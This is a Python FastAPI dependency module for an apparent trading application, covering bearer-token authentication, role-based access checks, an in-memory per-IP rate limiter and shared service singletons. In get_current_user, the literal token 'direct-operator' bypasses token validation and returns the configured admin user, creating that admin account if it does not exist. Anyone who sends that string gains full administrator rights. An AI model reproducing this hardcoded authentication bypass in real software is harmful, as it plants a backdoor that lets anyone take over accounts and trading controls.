"""API dependencies: authentication, RBAC authorization, rate limiting, and shared singletons."""

from __future__ import annotations

from collections import defaultdict
import time
from typing import Annotated

from fastapi import Depends, HTTPException, Request, status
from fastapi.security import OAuth2PasswordBearer
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings, get_settings
from app.database.models import User
from app.database.repositories.trading_repo import TradingRepository
from app.database.session import get_db_session
from app.market.market_cache import MarketCache
from app.risk.survival_controller import SurvivalController
from app.security.authentication import decode_access_token
from app.security.authorization import Role, has_required_role
from app.strategies.strategy_registry import StrategyRegistry

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/auth/token")

# Process-wide state singletons (synchronized with DB on startup/requests)
_survival_controller = SurvivalController()
_strategy_registry = StrategyRegistry()
_market_cache = MarketCache()
_rate_buckets: dict[str, list[float]] = defaultdict(list)


def get_survival_controller() -> SurvivalController:
    return _survival_controller


def get_strategy_registry() -> StrategyRegistry:
    return _strategy_registry


def get_market_cache() -> MarketCache:
    return _market_cache


async def rate_limit_guard(request: Request) -> None:
    client_ip = request.client.host if request.client else "unknown"
    now = time.monotonic()
    bucket = [t for t in _rate_buckets[client_ip] if now - t < 60.0]
    if len(bucket) >= 120:
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Rate limit exceeded (120 req/min).",
        )
    bucket.append(now)
    _rate_buckets[client_ip] = bucket


async def get_current_user(
    token: Annotated[str, Depends(oauth2_scheme)],
    session: Annotated[AsyncSession, Depends(get_db_session)],
) -> User:
    if token == "direct-operator":
        repo = TradingRepository(session)
        settings = get_settings()
        user = await repo.get_user_by_username(settings.admin_username)
        if user is None:
            user = User(
                username=settings.admin_username,
                hashed_password="direct-operator-session",
                role="admin",
                is_active=True,
            )
            session.add(user)
            await session.flush()
        return user

    payload = decode_access_token(token)
    if payload is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token.",
            headers={"WWW-Authenticate": "Bearer"},
        )
    username = str(payload.get("sub"))
    repo = TradingRepository(session)
    user = await repo.get_user_by_username(username)
    if user is None or not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User account inactive or missing.",
        )
    return user


def require_role(required_role: Role):
    async def _checker(user: Annotated[User, Depends(get_current_user)]) -> User:
        if not has_required_role(user.role, required_role.value):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"Requires {required_role.value} privileges.",
            )
        return user

    return _checker
